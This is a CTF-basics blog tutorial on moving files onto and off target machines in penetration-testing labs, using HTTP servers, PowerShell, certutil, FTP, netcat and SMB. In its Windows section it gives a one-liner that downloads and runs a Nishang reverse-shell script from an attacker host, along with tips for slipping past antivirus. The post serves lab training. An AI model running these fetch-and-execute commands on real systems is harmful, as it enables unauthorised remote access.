---
layout: single
classes: wide
title:  "Basics: File Transfer"
date:   2020-01-26 20:26:59 -0500
categories: ctf basics
---
This Basics post will outline some methods for transferring files on and off CTF machines. I'll be writing these posts as if you were working in a lab environment with others, as is the case with HTB and the PWK labs.

You'll often need to transfer files onto or off of a target machine once you have a shell, or to get a shell. The methods for doing so will vary depending on the target's OS and the network configuration. You aren't always going to have the best tools available, so it's smart to learn several methods.

## HTTP Server + wget/curl

This technique involves hosting a webserver on the machine that contains the content to be transferred, then using a program like wget or curl on the receiving machine to grab content from the server. This is what I find myself using the most.

### Setup

There's a number of ways to start an HTTP server on Kali, but I typically use Python's http.server module:

`$ python3 -m http.server 80`

This command will host an HTTP server on your machine on port 80. You can change the port number if you need to. The server's root will be at the directory in which the command was run. Use `Ctrl+C` to kill the server when you're done.

This method is more useful for getting files onto the victim machine, since you aren't always going to be able to start an HTTP Server from the victim to transfer files back.

However, if the victim machine is already running a web server and you have the neccessary permissions, you could just copy the files to the web server directory (Eg: `/var/www/html/` for Apache) and access them via browser/wget on your Kali machine. Just be courteous and clean up after yourself when you're done.

### Linux

From the victim machine, download the file with wget. I like to download files to `/dev/shm`.

`$ wget [YOUR_IP]:80/filetograb.sh`

### Windows

Windows doesn't have a standalone tool like wget to grab content from web servers. However, you can use PowerShell to do this. There are several different ways.

[Invoke-Webrequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-6) is one way. If a Powershell install (>= 3.0) exists on the system, you can use this method. Be aware that this command stores the entire file in memory before writing it, so it's not suitable for large files.

`PS> Invoke-Webrequest -Uri [YOUR_IP]/filetograb.bat -OutFile filetograb.bat`

[System.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?redirectedfrom=MSDN&view=net-7.0) is a .NET class you can use through PowerShell. I typically use its DownloadFile and DownloadString methods. I use DownloadFile for binaries, and DownloadString for scripts. I generally prefer these over Invoke-Webrequest.

DownloadFile requires that you specify the new location and filename, it does not implicitly dump it into the current working directory. This command downloads winPEAS from a Python webserver I'm hosting and dumps it into `C:\Users\Public\winPEASany.exe`.

`PS> (New-object System.Net.WebClient).DownloadFile('http://$ATTACKER_IP/winPEASany.exe', 'C:\Users\Public\winPEASany.exe')`

I like to use a combination of IEX and DownloadString to download and execute scripts in one go. This can be useful for getting a shell from a web application if you have RCE. This command will download Nishang's [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and execute it in the same line.

`> powershell.exe -c iex(new-object net.webclient).downloadstring('http://$ATTACKER_IP/Invoke-PowerShellTcp.ps1')`

If PowerShell is not available, you can also use the CertUtil binary to download files:

`> certutil.exe -urlcache -f http://YOUR_IP/meanfile.exe meanfile.exe`

## FTP

Unsurprisingly, File Transfer Protocol is useful for transferring files. This method involves starting an FTP server on your Kali machine and hosting files there. You can configure the server to allow anonymous logins and even give users write access if you need to transfer files back and forth. I would reccommend specifying a username and password though, especially in a lab environment with others. Just remember to kill the server when you're done.

### Setup
We can spin up an FTP server in one line using the `pytftpd` module in Python, similar to how we set up the HTTP server. The module doesn't come installed by default though, so you need to install it with apt or pip.

We can also use a Metasploit auxiliary module. From msfconsole, use `auxiliary/server/ftp`, set the options you want, then run.

Once you're done, kill it with `jobs -k [ID]`.

Using a more fully featured FTP server like `vsftpd` is an option, but these two methods are more convenient to spin up for a single use.

### Linux

Use `ftpclient` to log into your server and transfer your files.

### Windows

Windows has a built-in FTP client located at `C:\Windows\System32\ftp.exe`, so this method should almost always be available.

## Netcat/Ncat

One of Netcat's many functions is simple file transfer. A netcat binary is required on both machines to do this. On the recieving machine, start a listener and redirect the output into a file. On the machine you're tranferring from, start nc and use the file you want to transfer as input.

Ncat has this same functionality with a few bonuses. For one, the session shouldn't hang on a file transfer like it does with netcat. Also, it supports encryption. But you don't often find it on challenge machines, so most of the time you'll be using netcat.

This method is convenient on Linux because it requires no setup and almost every distribution has nc on it in some form. It's less convenient with Windows for reasons I outline in that section.

### Linux

Start a listener on the receiving machine:
`nc -lvp [LISTEN_PORT] > file.sh`
Once a connection is made to this port, it will output into `file.sh`.

Connect to it on the source machine:
`nc -nv [RECEIVING_MACHINE_IP] [LISTEN_PORT] < file.sh`
file.sh is the file you want to transfer.

You should see the familiar netcat connection message and the file should begin to download. One shortcoming of using nc for this is that there is no way to view the transfer progress, and the session will probably hang even if everything was successful. Once you're sure that the download is complete, you can Ctrl+C the session **on your own machine.**  This should give you your shell back on the victim machine and you'll have your shiny new file. If you kill the session on the victim then you'll just kill your shell.

### Windows

Technically, you can do the same thing on Windows. However, Windows doesn't have netcat by default, so you need to put it there. Probably via file transfer. So, to get file transfer via netcat on Windows, you first need file transfer to get netcat on Windows.

This isn't all bad though. There seem to be more ways to transfer a file onto Windows than off of it, so you can use another method to get netcat onto the Windows machine. Afterwards, you can use it to transfer files back to Kali.

A word of caution though, Windows AV really doesn't like netcat. `nc.exe` is picked up by quite a few antivirus programs, according to VirusTotal. You might be able to get by if you use the version without the `-e` option, or if the Windows machine is old or lacks AV.

You can find nc.exe on Kali at `/usr/share/windows-resources/binaries/nc.exe`.

If recieving machine:
`> nc.exe -lvp [LISTEN_PORT] > file.sh`

If source machine:
`> nc.exe -nv [RECEIVING_MACHINE_IP] [LISTEN_PORT] < file.sh`

## SMB

SMB is really convenient for getting files onto Windows. No tools are needed, since Windows can natively read UNC paths. It can also execute files directly from the SMB share without needing to copy them over first. This can help sidestep AV in some cases.

Works fine for Linux as well, but there's usually a more convenient method available.

### Setup
Once again, Python is the easiest way. `smbserver.py` from [impacket](https://github.com/SecureAuthCorp/impacket) will let us set up a basic SMB server in one line. You can of course set up a proper SMB server on Kali as well, but it's overkill for what we're doing here.

The share will be bound to port 445 and accepts any authentication. Use `Ctrl+C` to stop it when you're done. You can require a username and password with the `-username` and `-password` arguments.

Give it a share name and path to share:
`$ python smbserver.py [SHARE_NAME] [PATH]`

### Linux

You can use `smbclient`. Most distributions should have it installed.

### Windows

Since Windows natively handles UNC paths, you can work with the share path as if it were any other path. UNC paths are specified with double backslashes followed by the computer IP/hostname and share name.

`> dir \\[YOUR_IP]\[SHARE_NAME]`



